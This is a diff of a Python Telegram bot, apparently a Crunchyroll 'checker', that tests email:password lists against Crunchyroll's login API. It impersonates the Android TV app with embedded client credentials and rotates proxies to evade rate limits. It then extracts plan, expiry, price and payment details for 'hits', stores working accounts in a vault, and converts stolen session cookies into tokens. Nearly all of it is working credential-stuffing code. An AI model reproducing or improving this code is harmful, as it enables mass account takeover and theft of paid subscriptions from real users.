@@ -1,40 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-CrunchyrollChecker — UNIFIED PREMIUM BOT (v10 — BlazeNXT)
-====================================================================
-All legacy checkers merged into one, button-driven Telegram bot:
-
-  • CrunchyCLI.py            → email:pass account checks
-  • cc2.py                   → Oxaam auto-extract, TV activation
-  • crunchy_premium_bot_v8   → bot core: access codes, proxies, checker
-  • Baron app-API checker    → Android TV app flow (the one that HITS):
-        login via Crunchyroll/ANDROIDTV app UA, premium gate on
-        subs/v1 benefits (concurrent_streams), plan Fan/Mega/Ultimate,
-        subs/v3 expiry/sku/auto_renew, subs/v4 price/cycle/trial,
-        429 rate-limit short-circuit + retry, per-combo proxy rotation
-
-v10 PREMIUM — BlazeNXT
-  • 100% button flow, Bot API 9.4 colored buttons:
-        style "primary" (blue) / "success" (green) / "danger" (red)
-        + icon_custom_emoji_id — with automatic plain fallback
-  • BlazeNXT live scan card:
-        📈 CRUNCHYROLL Scan — Live  |  ▓▓▓░░ 63% [████████████░░░░] (30/47)
-        • Checked  • ⭐ Hits | 💎 Free | 🔐 2FA | ❌ Bad | ⚠️ Errors
-        📈 CPM  🕒 Elapsed  ⏳ ETA  |  📡 Live feed (last 3 emails)
-  • Premium dashboard (clean, no AIO grid — Crunchyroll only) — BlazeNXT
-  • ⭐ Full HIT card on every hit (email, password, plan, expiry,
-        days left, auto renew, trial, duration, price, country flag…)
-  • Proxy pool: paste proxies in chat → saved to disk, background
-        auto-checked (auto-check toggle), clear-pool button
-  • App-API checker with proxy→direct fallback per request (no more stuck)
-
-Deploy: Railway (see README) — railway.json + Procfile + requirements.txt
-Run:    BOT_TOKEN=... OWNER_ID=... python bot.py
+CrunchyrollChecker + Vault + Smart TV Login Bot
 """
 
 import os
 import re
+import io
 import sys
 import csv
 import json
@@ -43,6 +15,7 @@ import base64
 import random
 import asyncio
 import logging
+import zipfile
 import tempfile
 import threading
 import requests
@@ -56,13 +29,20 @@ try:
     from requests.adapters import HTTPAdapter
     from urllib3.util.retry import Retry
 except ImportError:
-    print("[!] pip3 install requests")
+    print("[!] pip install requests")
     sys.exit(1)
 
 try:
-    from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+    from telegram import (
+        Update,
+        InputFile,
+        InlineKeyboardButton,
+        InlineKeyboardMarkup,
+        ReplyKeyboardRemove,
+        BotCommand,
+    )
     from telegram.constants import ParseMode
-    from telegram.error import BadRequest, RetryAfter  # FloodWait in older PTB
+    from telegram.error import BadRequest, RetryAfter
     from telegram.ext import (
         Application,
         CommandHandler,
@@ -72,29 +52,23 @@ try:
         filters,
     )
 except ImportError:
-    print("[!] pip3 install python-telegram-bot==22.8")
+    print("[!] pip install python-telegram-bot==22.8")
     sys.exit(1)
 
 try:
     from bs4 import BeautifulSoup
 except ImportError:
-    BeautifulSoup = None  # oxaam parsing falls back to regex-only
+    BeautifulSoup = None
 
 try:
-    import socks  # noqa: F401  (PySocks — enables SOCKS5 proxy support)
+    import socks  # noqa: F401
     SOCKS5_OK = True
 except ImportError:
     SOCKS5_OK = False
 
-# Mini App removed — Crunchyroll single checker only
 
 # ===================== CONFIG (env-driven) =====================
 def _load_dotenv() -> None:
-    """Minimal .env loader (no extra dependency).
-
-    Real environment variables (e.g. the ones set in the Railway Variables tab)
-    always win — .env only fills in what is not set yet.
-    """
     env_path = Path(__file__).resolve().parent / ".env"
     if not env_path.exists():
         return
@@ -111,11 +85,13 @@ def _load_dotenv() -> None:
     except OSError:
         pass
 
+
 def _env(name: str, default: str = "") -> str:
     v = os.getenv(name)
     if v is None or str(v).strip() == "":
         return default
     return str(v).strip()
+
 
 _load_dotenv()
 
@@ -125,28 +101,54 @@ try:
 except ValueError:
     OWNER_ID = 0
 OWNER_USERNAME = _env("OWNER_USERNAME", "@unknown")
-# Multiple admins: OWNER_IDS (comma-separated) + ADMIN_USERNAMES (comma-separated, with or without @)
+
 _raw_ids = _env("OWNER_IDS", "") or _env("ADMIN_IDS", "")
 ADMIN_IDS = set()
 if _raw_ids:
-    for _x in _raw_ids.split(","):
-        _x=_x.strip()
+    for _x in re.split(r"[,\s]+", _raw_ids):
+        _x = _x.strip()
         if _x.isdigit():
-            try:
-                ADMIN_IDS.add(int(_x))
-            except: pass
+            ADMIN_IDS.add(int(_x))
 if OWNER_ID:
     ADMIN_IDS.add(OWNER_ID)
-# Admin usernames (lowercase, without @)
+
 _raw_un = _env("ADMIN_USERNAMES", "") or _env("ADMIN_USERNAME", "")
 ADMIN_USERNAMES = set()
 if _raw_un:
-    for _u in _raw_un.split(","):
-        _u=_u.strip().lstrip("@").lower()
+    for _u in re.split(r"[,\s]+", _raw_un):
+        _u = _u.strip().lstrip("@").lower()
         if _u:
             ADMIN_USERNAMES.add(_u)
 if OWNER_USERNAME and OWNER_USERNAME.lstrip("@"):
     ADMIN_USERNAMES.add(OWNER_USERNAME.lstrip("@").lower())
+
+DATA_DIR = Path(_env("DATA_DIR", "data"))
+DATA_DIR.mkdir(parents=True, exist_ok=True)
+VAULT_PATH = DATA_DIR / "cr_vault.json"
+
+PORT = int(_env("PORT", "8000") or 8000)
+THREADS = int(_env("THREADS", "150") or 150)
+PROXY_REFRESH_MINUTES = 5
+MAX_PROXIES_TO_KEEP = 500
+PROXY_TEST_TIMEOUT = 2
+PROXY_TEST_SAMPLE = 1000
+CHECK_TIMEOUT = 10
+
+DAILY_TV_LIMIT = int(_env("DAILY_TV_LIMIT", "10") or 10)
+IST = timezone(timedelta(hours=5, minutes=30))
+
+USER_LAST_CHECK: dict = {}
+USER_LOCK = threading.Lock()
+MAX_FILE_MB = 20
+PREMIUM_ONLY_DEFAULT = True
+MAX_PASTED_CREDS = 2000
+MAX_PASTED_PROXIES = 5000
+MAX_HIT_CARDS = 150
+
+START_TIME = time.time()
+CHECKS_DONE = 0
+CHECKS_LOCK = threading.Lock()
+
 
 def is_admin(uid: int, username: str = None) -> bool:
     if uid in ADMIN_IDS:
@@ -155,9 +157,8 @@ def is_admin(uid: int, username: str = None) -> bool:
         un = str(username).lstrip("@").lower()
         if un in ADMIN_USERNAMES:
             return True
-    # Dynamic admins via bot (owner adds)
     try:
-        if STORE and hasattr(STORE, 'get_setting'):
+        if STORE and hasattr(STORE, "get_setting"):
             dyn_ids = STORE.get_setting("admin_ids", []) or []
             if uid in dyn_ids:
                 return True
@@ -168,37 +169,12 @@ def is_admin(uid: int, username: str = None) -> bool:
         pass
     return False
 
-DATA_DIR = Path("data")
-DATA_DIR.mkdir(parents=True, exist_ok=True)
-
-# === BOT-ONLY CONFIG — env me bas BOT_TOKEN + OWNER_ID, baki sab bot se ===
-PORT = int(_env("PORT", "8000") or 8000)  # Railway PORT only
-
-THREADS = 150  # powerful default 150 (up to 500)  # default 120, bot se 300 tak change kar sakte ho (Tools → Set Threads)
-PROXY_REFRESH_MINUTES = 5  # 24x7 auto — refresh every 5 min
-MAX_PROXIES_TO_KEEP = 500  # 1:1 need many  # 24x7 keep more
-PROXY_TEST_TIMEOUT = 2  # 100x fast  # fast  # faster for 800-1000 cpm powerful • 24x7 auto proxy • Smart scoring
-PROXY_TEST_SAMPLE = 1000  # 100x fast - test more  # more
-CHECK_TIMEOUT = 10  # fast secure
-# Secure: per-user rate limit
-USER_LAST_CHECK: dict = {}
-USER_LOCK = threading.Lock()
-SECURE_LOG = True
-MAX_FILE_MB = 20  # Telegram Bot API download limit
-PREMIUM_ONLY_DEFAULT = True
-MAX_PASTED_CREDS = 2000
-MAX_PASTED_PROXIES = 5000
-MAX_THREADS_USER = 500  # powerful — 500 max for high speed  # max threads user can set (like RESIROX max 500)
-MAX_HIT_CARDS = 150  # per-hit detail cards per check (rest goes to the export file)
-
-START_TIME = time.time()
-CHECKS_DONE = 0
-CHECKS_LOCK = threading.Lock()
 
 def bump_checks(n: int) -> None:
     global CHECKS_DONE
     with CHECKS_LOCK:
         CHECKS_DONE += n
+
 
 def uptime() -> str:
     s = int(time.time() - START_TIME)
@@ -213,28 +189,25 @@ def uptime() -> str:
     parts.append(f"{m}m {sec}s")
     return " ".join(parts)
 
+
 def _fmt_duration(sec: float) -> str:
-    """Format seconds as '1m 10s' or '192m 18s' like BlazeNXT."""
-    sec = int(sec)
-    if sec < 0:
-        sec = 0
+    sec = max(0, int(sec))
     m, s = divmod(sec, 60)
     h, m = divmod(m, 60)
-    if h:
-        return f"{h}h {m}m {s}s"
-    return f"{m}m {s}s"
+    return f"{h}h {m}m {s}s" if h else f"{m}m {s}s"
+
 
 def _fmt_cpm(processed: int, elapsed: float) -> int:
     if elapsed <= 0 or processed <= 0:
         return 0
     return int(processed / elapsed * 60)
 
+
 def _fmt_eta(total: int, processed: int, cpm: int) -> str:
     if cpm <= 0 or total <= processed:
         return "—"
-    remaining = total - processed
-    eta_sec = int(remaining * 60 / cpm)
-    return _fmt_duration(eta_sec)
+    return _fmt_duration(int((total - processed) * 60 / cpm))
+
 
 logging.basicConfig(
     level=logging.INFO,
@@ -243,15 +216,17 @@ logging.basicConfig(
 )
 logger = logging.getLogger("CrunchyBot")
 
+
 # ===================== SMALL HELPERS =====================
 def esc(v) -> str:
-    """HTML-escape for safe Telegram HTML messages."""
     if v is None or v == "":
         return "N/A"
     return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
+
 def now_utc() -> datetime:
     return datetime.now(timezone.utc)
+
 
 def parse_iso(s) -> Optional[datetime]:
     if not s:
@@ -264,10 +239,6 @@ def parse_iso(s) -> Optional[datetime]:
     except (ValueError, TypeError):
         return None
 
-def fmt_dt(dt: Optional[datetime]) -> str:
-    if not dt:
-        return "N/A"
-    return dt.astimezone(timezone.utc).strftime("%d-%m-%Y %H:%M UTC")
 
 def days_left_until(iso_date: str) -> str:
     if not iso_date:
@@ -277,92 +248,164 @@ def days_left_until(iso_date: str) -> str:
         return "N/A"
     return str(max(0, (dt - now_utc()).days))
 
-def generate_code() -> str:
-    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
-    return "".join(random.choice(chars) for _ in range(12))
 
 def _clean_err(e) -> str:
-    """Collapse newlines/whitespace from exception strings for tidy output."""
     return " ".join(str(e).split())[:60]
 
+
 def flag_emoji(cc) -> str:
-    """Country code -> flag emoji (IN -> 🇮)."""
     cc = (cc or "").upper().strip()
     if len(cc) != 2 or not cc.isalpha():
         return ""
     return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)
 
+
+# ===================== VAULT STORAGE =====================
+_VAULT_LOCK = threading.Lock()
+
+
+def load_vault() -> List[dict]:
+    with _VAULT_LOCK:
+        if VAULT_PATH.exists():
+            try:
+                return json.loads(VAULT_PATH.read_text(encoding="utf-8"))
+            except Exception:
+                return []
+        return []
+
+
+def save_vault(items: List[dict]) -> None:
+    with _VAULT_LOCK:
+        try:
+            tmp = VAULT_PATH.with_suffix(".tmp")
+            tmp.write_text(json.dumps(items, indent=2, ensure_ascii=False), encoding="utf-8")
+            os.replace(tmp, VAULT_PATH)
+        except Exception as e:
+            logger.warning("Vault save failed: %s", e)
+
+
+def _cred_key(cred: dict) -> str:
+    t = cred.get("type", "")
+    v = cred.get("value", "")
+    return f"{t}:{v.lower() if t == 'email' else v[:64]}"
+
+
+def add_to_vault(entries: List[dict]) -> int:
+    if not entries:
+        return 0
+    with _VAULT_LOCK:
+        current = []
+        if VAULT_PATH.exists():
+            try:
+                current = json.loads(VAULT_PATH.read_text(encoding="utf-8"))
+            except Exception:
+                current = []
+        have = {_cred_key(x.get("cred", {})) for x in current}
+        added = 0
+        for e in entries:
+            cred = e.get("cred") or {}
+            k = _cred_key(cred)
+            if not k or k in have:
+                continue
+            current.append({
+                "cred": cred,
+                "data": e.get("data") or {},
+                "added_at": int(time.time()),
+            })
+            have.add(k)
+            added += 1
+        if added:
+            try:
+                tmp = VAULT_PATH.with_suffix(".tmp")
+                tmp.write_text(json.dumps(current, indent=2, ensure_ascii=False), encoding="utf-8")
+                os.replace(tmp, VAULT_PATH)
+            except Exception as exc:
+                logger.warning("Vault write failed: %s", exc)
+        return added
+
+
+def remove_from_vault(cred: dict) -> None:
+    target = _cred_key(cred)
+    with _VAULT_LOCK:
+        if not VAULT_PATH.exists():
+            return
+        try:
+            current = json.loads(VAULT_PATH.read_text(encoding="utf-8"))
+        except Exception:
+            return
+        filtered = [x for x in current if _cred_key(x.get("cred", {})) != target]
+        if len(filtered) != len(current):
+            try:
+                tmp = VAULT_PATH.with_suffix(".tmp")
+                tmp.write_text(json.dumps(filtered, indent=2, ensure_ascii=False), encoding="utf-8")
+                os.replace(tmp, VAULT_PATH)
+            except Exception:
+                pass
+
+
+def vault_count() -> int:
+    return len(load_vault())
+
+
+# ===================== TV QUOTA =====================
+_tv_quota: Dict[int, dict] = {}
+_TV_QUOTA_LOCK = threading.Lock()
+
+
+def tv_quota_check(uid: int, username: str = None):
+    if is_admin(uid, username):
+        return True, 9999
+    today = datetime.now(IST).strftime("%Y-%m-%d")
+    with _TV_QUOTA_LOCK:
+        rec = _tv_quota.setdefault(uid, {"date": today, "count": 0})
+        if rec["date"] != today:
+            rec["date"] = today
+            rec["count"] = 0
+        rem = DAILY_TV_LIMIT - rec["count"]
+        return rem > 0, max(0, rem)
+
+
+def tv_quota_inc(uid: int, username: str = None) -> None:
+    if is_admin(uid, username):
+        return
+    today = datetime.now(IST).strftime("%Y-%m-%d")
+    with _TV_QUOTA_LOCK:
+        rec = _tv_quota.setdefault(uid, {"date": today, "count": 0})
+        if rec["date"] != today:
+            rec["date"] = today
+            rec["count"] = 0
+        rec["count"] += 1
+
+
 # ===================== CRUNCHYROLL API =====================
 API_HOST = "https://beta-api.crunchyroll.com"
-# Public web-SSO client id/secret (same as the official client, used by all legacy tools)
 CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
 CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
 
-# App (Android TV) flow — the "Baron" flow that hits valid accounts
 APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
 APP_DEVICE_TYPE = "Google SDK built for x86"
 APP_DEVICE_NAME = "sdk_google_atv_x86"
-BARO_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
-            "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
+BARO_WUA = (
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"
+)
 PLAN_BY_STREAMS = {"1": "Fan", "4": "Mega Fan", "6": "Ultimate Fan"}
 BILLING_MAP = {"P1D": "Daily", "P1W": "Weekly", "P1M": "Monthly", "P3M": "3 Months", "P1Y": "Annual"}
 
 COUNTRY_MAP = {
-    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
-    "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
-    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
-    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
-    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
-    "BO": "Bolivia", "BA": "Bosnia and Herzegovin", "BW": "Botswana", "BR": "Brazil",
-    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
-    "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
-    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
-    "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
-    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
-    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
-    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
-    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
-    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
-    "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
-    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
-    "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
-    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
-    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
-    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
-    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
-    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
-    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
-    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
-    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
-    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
-    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
-    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
-    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
-    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
-    "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
-    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
-    "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
-    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
-    "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
-    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
-    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
-    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
-    "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
-    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
-    "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
-    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
-    "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
-    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
-    "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
-    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
-    "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
-    "ZW": "Zimbabwe",
+    "IN": "India", "US": "United States", "GB": "United Kingdom", "CA": "Canada",
+    "AU": "Australia", "DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain",
+    "BR": "Brazil", "MX": "Mexico", "AR": "Argentina", "CL": "Chile", "CO": "Colombia",
+    "PE": "Peru", "JP": "Japan", "KR": "South Korea", "SG": "Singapore", "MY": "Malaysia",
+    "TH": "Thailand", "PH": "Philippines", "ID": "Indonesia", "VN": "Vietnam",
+    "PK": "Pakistan", "BD": "Bangladesh", "AE": "UAE", "SA": "Saudi Arabia",
+    "TR": "Turkey", "NL": "Netherlands", "SE": "Sweden", "NO": "Norway", "PL": "Poland",
 }
 
 _tls = threading.local()
 
+
 def get_session() -> requests.Session:
-    """Thread-local session — fast + secure (100 pools, keep-alive, retry)."""
     s = getattr(_tls, "s", None)
     if s is None:
         s = requests.Session()
@@ -378,8 +421,8 @@ def get_session() -> requests.Session:
         _tls.s = s
     return s
 
+
 def _req(session, method, url, proxy, **kw):
-    """Request with proxy -> direct fallback (dead proxy must never kill a check)."""
     try:
         return session.request(method, url, proxies=proxy, timeout=CHECK_TIMEOUT, **kw)
     except requests.RequestException:
@@ -387,50 +430,75 @@ def _req(session, method, url, proxy, **kw):
             return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
         raise
 
+
 def _blank_data(user: str) -> dict:
     return {
-        "user": user.split("@")[0] if user else "", "verified": False,
-        "plan": "", "sku": "", "streams": "", "expiry": "", "days_left": "N/A",
-        "renew": False, "trial": False, "duration": "", "price": "",
-        "currency": "", "plan_type": "", "created": "", "payment": "",
-        "cc": "", "country_name": "", "info": "",
-        # Detailed checker fields
-        "account_id": "", "external_id": "", "sub_id": "", "sub_status": "",
-        "next_renewal": "", "start_date": "", "billing_cycle": "",
-        "payment_method": "", "benefits": "", "checked_at": "",
-        "proxy_used": "", "response_time": "",
+        "user": user.split("@")[0] if user else "",
+        "verified": False,
+        "plan": "",
+        "sku": "",
+        "streams": "",
+        "expiry": "",
+        "days_left": "N/A",
+        "renew": False,
+        "trial": False,
+        "duration": "",
+        "price": "",
+        "currency": "",
+        "plan_type": "",
+        "created": "",
+        "payment": "",
+        "cc": "",
+        "country_name": "",
+        "info": "",
+        "account_id": "",
+        "external_id": "",
+        "sub_id": "",
+        "sub_status": "",
+        "next_renewal": "",
+        "start_date": "",
+        "billing_cycle": "",
+        "payment_method": "",
+        "benefits": "",
     }
 
-# ---------------- App-API login (Baron flow) ----------------
+
 def app_login(user: str, pw: str, proxy: Optional[dict] = None):
-    """Android TV password-grant login. Returns (token_json|None, st)."""
     s = get_session()
     try:
-        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy, data={
-            "grant_type": "password",
-            "username": user, "password": pw,
-            "scope": "offline_access",
-            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
-            "device_type": APP_DEVICE_TYPE,
-            "device_id": str(uuid.uuid4()),
-            "device_name": APP_DEVICE_NAME,
-        }, headers={
-            "User-Agent": APP_UA,
-            "Accept": "application/json",
-            "Accept-Charset": "UTF-8",
-            "Accept-Encoding": "gzip",
-            "Connection": "Keep-Alive",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "ETP-Anonymous-ID": str(uuid.uuid4()),
-            "Request-Type": "SignIn",
-        })
+        r = _req(
+            s,
+            "POST",
+            f"{API_HOST}/auth/v1/token",
+            proxy,
+            data={
+                "grant_type": "password",
+                "username": user,
+                "password": pw,
+                "scope": "offline_access",
+                "client_id": CLIENT_ID,
+                "client_secret": CLIENT_SECRET,
+                "device_type": APP_DEVICE_TYPE,
+                "device_id": str(uuid.uuid4()),
+                "device_name": APP_DEVICE_NAME,
+            },
+            headers={
+                "User-Agent": APP_UA,
+                "Accept": "application/json",
+                "Accept-Charset": "UTF-8",
+                "Accept-Encoding": "gzip",
+                "Connection": "Keep-Alive",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "ETP-Anonymous-ID": str(uuid.uuid4()),
+                "Request-Type": "SignIn",
+            },
+        )
     except requests.RequestException as e:
         return None, f"network: {_clean_err(e)}"
     src = r.text or ""
     low = src.lower()
     if r.status_code == 429 or "too_many_requests" in src or "rate limited" in low:
         return None, "rate"
-    # 2FA / MFA detection (counts as distinct bucket in premium UI)
     if any(x in low for x in ("two_factor", "2fa", "mfa_required", "otp_required", "otp_code", "verification_required")):
         return None, "2fa"
     if "invalid_grant" in src or "invalid_credentials" in src or r.status_code in (400, 401):
@@ -443,18 +511,13 @@ def app_login(user: str, pw: str, proxy: Optional[dict] = None):
         return None, "no token"
     return j, "ok"
 
-# ---------------- App-API account check (the HITTER) ----------------
+
 def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
-    """Baron app-API flow. Returns (st, data): st in hit/free/bad/rate/err."""
     d = _blank_data(user)
     j, st = app_login(user, pw, proxy)
     if j is None:
-        if st == "bad":
-            return "bad", d
-        if st == "rate":
-            return "rate", d
-        if st == "2fa":
-            return "2fa", d
+        if st in ("bad", "rate", "2fa"):
+            return st, d
         return "err", d
     tk = j["access_token"]
     hdr = {
@@ -465,21 +528,17 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
     }
     s = get_session()
 
-    # multiprofile -> display name
     try:
         r = _req(s, "GET", f"{API_HOST}/accounts/v1/me/multiprofile", proxy, headers=hdr)
         mp = r.json()
         if isinstance(mp, dict):
             profiles = mp.get("profiles") or []
-            primary = next((p for p in profiles if p.get("is_primary")), None)
-            if not primary and profiles:
-                primary = profiles[0]
+            primary = next((p for p in profiles if p.get("is_primary")), None) or (profiles[0] if profiles else None)
             if primary and primary.get("profile_name"):
                 d["user"] = primary["profile_name"]
     except (requests.RequestException, ValueError):
         pass
 
-    # /me -> ids + verified
     me = {}
     try:
         r = _req(s, "GET", f"{API_HOST}/accounts/v1/me", proxy, headers=hdr)
@@ -495,23 +554,21 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
     if not ext:
         return "free", d
 
-    # benefits v1 — the premium gate (Baron logic)
     try:
         r = _req(s, "GET", f"{API_HOST}/subs/v1/subscriptions/{ext}/benefits", proxy, headers=hdr)
         bsrc = r.text if r.status_code == 200 else ""
     except requests.RequestException:
         bsrc = ""
-    if not bsrc or any(x in bsrc for x in (
-        "subscription.not_found", "Subscription Not Found",
-        '"total":0', '"subscription_country":""',
-    )) or "concurrent_streams" not in bsrc:
+    if (
+        not bsrc
+        or any(x in bsrc for x in ("subscription.not_found", "Subscription Not Found", '"total":0', '"subscription_country":""'))
+        or "concurrent_streams" not in bsrc
+    ):
         return "free", d
 
-    # Detailed: store ids
     d["account_id"] = acc or ""
     d["external_id"] = ext or ""
-    d["benefits"] = bsrc[:500] if bsrc else ""
-    # HIT
+    d["benefits"] = bsrc[:500]
     m = re.search(r'"concurrent_streams\.(\d+)"', bsrc)
     if m:
         d["streams"] = m.group(1)
@@ -525,7 +582,6 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
         d["payment"] = m.group(1)
         d["payment_method"] = m.group(1)
 
-    # subs v3 — expiry / sku / auto renew
     if acc:
         try:
             r = _req(s, "GET", f"{API_HOST}/subs/v3/subscriptions/{acc}", proxy, headers=hdr)
@@ -540,17 +596,9 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
             m = re.search(r'"sku"\s*:\s*"([^"]+)"', s3)
             if m:
                 d["sku"] = m.group(1)
-            # detailed
-            m = re.search(r'"subscription_id"\s*:\s*"([^"]+)"', s3)
-            if m:
-                d["sub_id"] = m.group(1)
-            m = re.search(r'"status"\s*:\s*"([^"]+)"', s3)
-            if m:
-                d["sub_status"] = m.group(1)
         except requests.RequestException:
             pass
 
-    # subs v4 — price / cycle / trial / plan type / created (rich card)
     if acc:
         try:
             r = _req(s, "GET", f"{API_HOST}/subs/v4/accounts/{acc}/subscriptions", proxy, headers=hdr)
@@ -574,26 +622,17 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
                 if price4.get("amount") is not None:
                     d["price"] = str(price4["amount"])
                     d["currency"] = price4.get("currencyCode", "")
-                # detailed billing
-                d["billing_cycle"] = price4.get("cycleDuration") or d.get("duration", "")
-                d["next_renewal"] = sub4.get("nextRenewalDate", "")[:10] if sub4.get("nextRenewalDate") else d.get("expiry", "")
-                d["start_date"] = sub4.get("startDate", "")[:10] if sub4.get("startDate") else d.get("created", "")
-                d["sub_status"] = sub4.get("status", "") or d.get("sub_status", "")
-                d["sub_id"] = sub4.get("subscriptionId", "") or sub4.get("id", "") or d.get("sub_id", "")
                 pay = v4.get("currentPaymentMethod") or {}
                 if pay.get("name") and not d["payment"]:
                     d["payment"] = pay["name"]
-                d["payment_method"] = pay.get("name", "") or d.get("payment", "")
         except (requests.RequestException, ValueError):
             pass
     return "hit", d
 
-def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 1):
-    """Smart retry: quick, no long sleep to avoid stuck (was 4-7s)."""
+
+def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None):
     st, d = check_account_app(user, pw, proxy)
     if st == "rate":
-        # Don't sleep long — just return rate, let next combo use fresh proxy
-        # Quick single retry with new proxy if available
         try:
             new_proxy = get_random_proxy()
             if new_proxy and new_proxy != proxy:
@@ -605,7 +644,7 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
             pass
     return st, d
 
-# ---------------- Token / cookie checks (web flow) ----------------
+
 def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
     s = get_session()
     data = {
@@ -621,9 +660,14 @@ def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
         "Referer": "https://www.crunchyroll.com/",
     }
     try:
-        r = s.post(
-            f"{API_HOST}/auth/v1/token", data=data, headers=headers,
-            cookies={"etp_rt": etp_rt}, timeout=CHECK_TIMEOUT, proxies=proxy,
+        r = _req(
+            s,
+            "POST",
+            f"{API_HOST}/auth/v1/token",
+            proxy,
+            data=data,
+            headers=headers,
+            cookies={"etp_rt": etp_rt},
         )
     except requests.RequestException as e:
         return None, f"network: {_clean_err(e)}"
@@ -635,16 +679,19 @@ def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
         return None, (j or {}).get("error") or (j or {}).get("code") or f"http_{r.status_code}"
     return j, ""
 
+
 def cr_me(bearer: str, proxy: Optional[dict] = None):
     s = get_session()
     try:
